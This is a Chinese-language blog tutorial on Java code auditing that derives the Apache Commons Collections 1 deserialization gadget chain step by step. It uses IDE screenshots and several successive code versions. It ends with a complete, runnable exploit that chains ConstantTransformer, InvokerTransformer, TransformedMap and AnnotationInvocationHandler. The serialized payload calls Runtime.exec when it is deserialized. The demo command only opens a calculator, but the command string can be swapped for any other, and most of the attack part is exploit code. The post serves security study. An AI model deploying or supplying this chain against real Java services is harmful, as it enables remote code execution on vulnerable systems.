---
title: cc1
date: 2026-08-02 20:47:50
categories:
  - java代码审计
tags:
  - Java
  - 反序列化
  - Commons Collections
---

首先去transform接口找寻可以exec的方法

![image-20260802172010802](/images/java-code-audit/01-cc1/20260802172011007.png)

快捷键 ctrl + alt + B，查看实现接口的类

在在 `InvokerTransformer` 类中存在一个反射调用任意类，可以作为我们链子的终点

![image-20260802172126005](/images/java-code-audit/01-cc1/20260802172126059.png)

接下来找谁可以调用transform方法，通过alt+F7得到

![image-20260802175457914](/images/java-code-audit/01-cc1/20260802175458063.png)

其中 `TransformedMap` 类中存在 `checkSetValue()` 方法调用了 `transform()` 方法

- OK，接下来我们去看一看 `valueTransformer.checkSetValue` 的 `valueTransformer` 是什么东西，最终在 `TransformedMap` 的构造函数中发现了 `valueTransformer`

![image-20260802175919175](/images/java-code-audit/01-cc1/20260802175919213.png)

- 因为 `TransformedMap` 的构造方法作用域是 `protected`，我们还需要去找一找谁调用了 `TransformedMap` 的构造方法。

在 `decorate()` 静态方法中创建了 `TransformedMap` 对象

![image-20260802180526978](/images/java-code-audit/01-cc1/20260802180527041.png)

### 编写poc，开始是map类

```java
public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();
        Map decorate = TransformedMap.decorate(map, null, invokerTransformer);
        Class<TransformedMap> transformedMapClass = TransformedMap.class;
        Method checkSetValue = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
        checkSetValue.setAccessible(true);
        checkSetValue.invoke(decorate,runtime);
    }
```

- 在执行 `.decorate` 方法的时候，会新建 `TransformedMap` 对象，我们调用对象的 `checkSetValue` 方法（因为我们无法直接获取 `TransformedMap` 对象，它的作用域是 `protected`）。

- 目前找到的链子位于 `checkSetValue` 当中，去找 `.decorate` 的链子，发现无法进一步前进了，所以我们回到 `checkSetValue` 重新找链子。

继续 `find usages`，找到了 `parent.checkSetValue(value);` 调用了 `checkSetValue`

![image-20260802182230869](/images/java-code-audit/01-cc1/20260802182230930.png)

`setValue()` **实际上就是在 Map 中对一组 entry（键值对）**进行 `setValue()` 操作

![image-20260802183133912](/images/java-code-audit/01-cc1/20260802183133966.png)

![image-20260802183207234](/images/java-code-audit/01-cc1/20260802183207291.png)

所以，我们在进行 `.decorate` 方法调用，进行 Map 遍历的时候，就会走到 `setValue()` 当中，而 `setValue()` 就会调用 `checkSetValue`

- 到此处，我们的攻击思路出来了，找到一个是数组的入口类，遍历这个数组，并执行 `setValue` 方法，即可构造 Poc。

一句话概括一下

> 如何遍历一个Map最终执行 `setValue()` 方法

**如果能找到一个 `readObject()` 里面调用了 `setValue()` 就太好了**

### 寻找 readObject() 

- 我们注意到类的名字为 `AnnotationInvocationHandler`，`InvocationHandler` 这个后缀，我在动态代理里面提到过，是用做**动态代理中间处理**，因为它继承了 `InvocationHandler` 接口。

![image-20260802193418365](/images/java-code-audit/01-cc1/20260802193418680.png)

然后，`readObject` 的方法是类 `AnnotationInvocationHandler` 的，`AnnotationInvocationHandler` 的作用域为 `default`，我们需要通过反射的方式来获取这个类及其构造函数，再实例化它。

![image-20260802193710955](/images/java-code-audit/01-cc1/20260802193711027.png)

注意传参编写exp

理想的exp是

```java
package com.example;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class cc_1 {
    public static void main(String[] args) throws Exception {
       /*Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();
        Map decorate = TransformedMap.decorate(map, null, invokerTransformer);
        Class<TransformedMap> transformedMapClass = TransformedMap.class;
        Method checkSetValue = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
        checkSetValue.setAccessible(true);
        checkSetValue.invoke(decorate,runtime);*/
        /*Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                , new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("key", "value");
        Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
        for (Map.Entry entry : decorateMap.entrySet()) {
            entry.setValue(runtime);
        }
        new AnnotationInvocationHandler*/
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();
        map.put("key","value");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Override.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;

    }
}


```

但是

> 目前有三个亟待解决的问题

> ①：`Runtime` 对象不可序列化，需要通过反射将其变成可以序列化的形式。

> ②：`setValue()` 的传参，是需要传 `Runtime` 对象的；而在实际情况当中的 `setValue()` 的传参是这个东西
>
> ③：解决上文提到的，要进入 `setValue` 的两个 if 判断

即使现在的exp能运行，但是无法弹出计算器

![image-20260802195452161](/images/java-code-audit/01-cc1/20260802195452304.png)

实际传参并不是runtime对象

### 解决问题 ① Runtime 不能序列化

`Runtime` 是不能序列化的，但是 `Runtime.class` 是可以序列化的。

普遍反射是这样

```java
package FinalEXP;  
  
import java.lang.reflect.Method;  
  
public class SolvedProblemRuntime {  
    public static void main(String[] args) throws Exception{  
        Class c = Runtime.class;  
 Method method = c.getMethod("getRuntime");  
 Runtime runtime = (Runtime) method.invoke(null, null);  
 Method run = c.getMethod("exec", String.class);  
 run.invoke(runtime, "calc");  
 }  
}
```

如果exp里代码会更加冗长，所以这里通过chainedtransformer通过数组调用

```java
Transformer[] transformers = new Transformer[]{
        new InvokerTransformer("getMethod"
                , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke"
                , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec"
                , new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(Runtime.class);
//InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
HashMap<Object, Object> map = new HashMap<>();
map.put("key","value");
Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
```

- 至此，Runtime 的问题已经解决完毕。但是我们的 EXP 运行时不会弹出计算器，是因为我们的 EXP 并没有 `transformer` 的调用。我们可以调试一下，去看看问题出在哪里。
- 断点位置：先打在 `AnnotationInvocationHandler` 的两个 if 判断。

![image-20260802201641464](/images/java-code-audit/01-cc1/20260802201641535.png)

![image-20260802201725602](/images/java-code-audit/01-cc1/20260802201725681.png)

我们的 EXP 并没有走到 `setValue` 中去，而是在第一个 if 就跳出去了。

### 解决问题 ② 进入到 setValue 方法

- 绕过两个 if，进入 `setValue` 方法。

第一个 if 语句 `if (memberType != null)`，跳出来的原因是我们传入的 `memberType` 为 null 了，为什么会这样呢？我们去看看 `memberType` 究竟为何方神圣。

![image-20260802202112429](/images/java-code-audit/01-cc1/20260802202112486.png)

获取成员方法注解

由于成员方法为空导致我们跳出了第一个if

我们需要给这注释赋一个值

type: "interface java.lang.0verride"

![image-20260802202435124](/images/java-code-audit/01-cc1/20260802202435192.png)

我们的要求是，传入的注解参数，是有成员变量的。
并且要求 `hashMap.put("para1", "para2")` 中的 `para1` 与成员变量相对应。当然这是第二个 if 的事儿了。

我们点进 `Override` 中，看看问题是不是出在传参上了。

- 空空如也，里面是没有成员变量的，我们要去找另外的注解。

![image-20260802202516667](/images/java-code-audit/01-cc1/20260802202516725.png)

这里我们用 `Target.class` 尝试一下，点进 `Target`，当中有一个成员变量为 `value`，所以我们 `hashmap.put` 也需要修改为 `value`。

![image-20260802202553356](/images/java-code-audit/01-cc1/20260802202553410.png)

思路是这个

![img](/images/java-code-audit/01-cc1/ChangePara.png)

调试一下已经不为空了

![image-20260802203040024](/images/java-code-audit/01-cc1/20260802203040095.png)

成功通过两个if进入setvalue

![image-20260802203408618](/images/java-code-audit/01-cc1/20260802203408682.png)

我们继续往下跟程序，发现 `setValue()` 处中的参数并不可控，而是指定了 `AnnotationTypeMismatchExceptionProxy` 类，是无法进行命令执行的。

我们需要找到一个类，能够可控 `setValue` 的参数。

###  解决最终问题，编写 EXP

- 我们这里找到了一个能够解决 `setValue` 可控参数的类 ———— `ConstantTransformer`。

这个类完美符合我们的要求，点进去看一看。

![image-20260802203817332](/images/java-code-audit/01-cc1/20260802203817395.png)

- 构造方法：传入的任何对象都放在 `iConstant` 中
- `transform()` 方法：无论传入什么，都返回 `iConstant`，这就类似于一个常量了。

那么我们可以利用这一点，将 `AnnotationTypeMismatchExceptionProxy` 类作为 `transform()` 方法的参数，也就是这个无关的类，作为参数，我们先传入一个 `Runtime.class`，然后无论 `transform()` 方法会调用什么对象，都会返回 `Runtime.class`

```java
package com.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class cc_1 {
    public static void main(String[] args) throws Exception {
       /*Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();
        Map decorate = TransformedMap.decorate(map, null, invokerTransformer);
        Class<TransformedMap> transformedMapClass = TransformedMap.class;
        Method checkSetValue = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
        checkSetValue.setAccessible(true);
        checkSetValue.invoke(decorate,runtime);*/
        /*Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                , new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("key", "value");
        Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
        for (Map.Entry entry : decorateMap.entrySet()) {
            entry.setValue(runtime);
        }
        new AnnotationInvocationHandler*/

        //Runtime不能序列化，但是Runtime.class可以
       /* Runtime.class普通反射
        Class c = Runtime.class;
        Method method = c.getMethod("getRuntime");
        Runtime runtime = (Runtime) method.invoke(null, null);
        Method run = c.getMethod("exec", String.class);
        run.invoke(runtime, "calc");*/
        
        
        //Runtime runtime = Runtime.getRuntime();
        //Class c = Runtime.class;
       // Method runtimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class}, new Object[]{"getRuntime", null}.transform(c));

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);
        //InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","roxci");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;

    }
}


```

最终exp，简洁版

```java
public class cc_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","roxci");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;

    }
}
```

